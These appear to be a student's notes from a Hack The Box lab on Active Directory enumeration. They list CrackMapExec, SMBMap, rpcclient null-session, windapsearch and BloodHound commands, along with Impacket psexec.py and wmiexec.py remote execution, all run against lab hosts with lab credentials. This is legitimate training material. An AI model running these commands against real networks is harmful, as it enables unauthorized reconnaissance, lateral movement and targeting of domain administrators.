
## Credential Enumeration Using Crackmapexec 

We'll start by using the SMB protocol to enumerate users and groups.

#### CME - Domain User Enumeration

	AstraX01@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

#### CME - Domain Group Enumeration

We can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.

	AstraX01@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

Take note of key groups like `Administrators`, `Domain Admins`, `Executives`, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting during our assessment.

#### CME - Logged On Users

	AstraX01@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

#### CME Share Searching

We can use the `--shares` flag to enumerate available shares on the remote host and the level of access our user account has to each share (READ or WRITE access).

	AstraX01@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

we can dig into the shares and spider each directory looking for files. The module `spider_plus` will dig through each readable share on the host and list all readable files. Let's give it a try.

#### Spider_plus

	AstraX01@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

When completed, CME writes the results to a JSON file located at `/tmp/cme_spider_plus/<ip of host>`.

	AstraX01@htb[/htb]$ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 


---

## SMBMap For Enumeration 


#### SMBMap To Check Access

	AstraX01@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

#### Recursive List Of All Directories

	AstraX01@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

The use of `--dir-only` provided only the output of all directories and did not list all files.

---
## rpcclient

It can enumerate, add, change, and even remove objects from AD.

#### SMB NULL Session with rpcclient

	rpcclient -U "" -N 172.16.5.5

We will dig a bit targeting the `htb-student` user.

#### RPCClient User Enumeration By RID

	rpcclient $> queryuser 0x457

When we searched for information using the `queryuser` command against the RID `0x457`, RPC returned the user information for `htb-student` as expected

#### Enumdomusers

	rpcclient $> enumdomusers


---

## Impacket Toolkit

#### Using psexec.py

To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.

	psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125


---
#### Using wmiexec.py

	wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5


---

## Windapsearch

#### Windapsearch - Domain Admins

	AstraX01@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

To identify more potential users, we can run the tool with the `-PU` flag and check for users with elevated privileges that may have gone unnoticed.

#### Windapsearch - Privileged Users

	AstraX01@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

## Bloodhound.py

#### Executing BloodHound.py

As we can see the tool accepts various collection methods with the `-c` or `--collectionmethod` flag. We can retrieve specific data such as user sessions, users and groups, object properties, ACLS, or select `all` to gather as much data as possible.

	AstraX01@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all

#### Upload the Zip File into the BloodHound GUI

We could then type `sudo neo4j start` to start the [neo4j](https://neo4j.com/) service, firing up the database we'll load the data into and also run Cypher queries against.

Next, we can type `bloodhound` from our Linux attack host when logged in using `freerdp` to start the BloodHound GUI application and upload the data.

#### Searching for Relationships In Bloodhound 

The query chosen to produce the map above was `Find Shortest Paths To Domain Admins`.

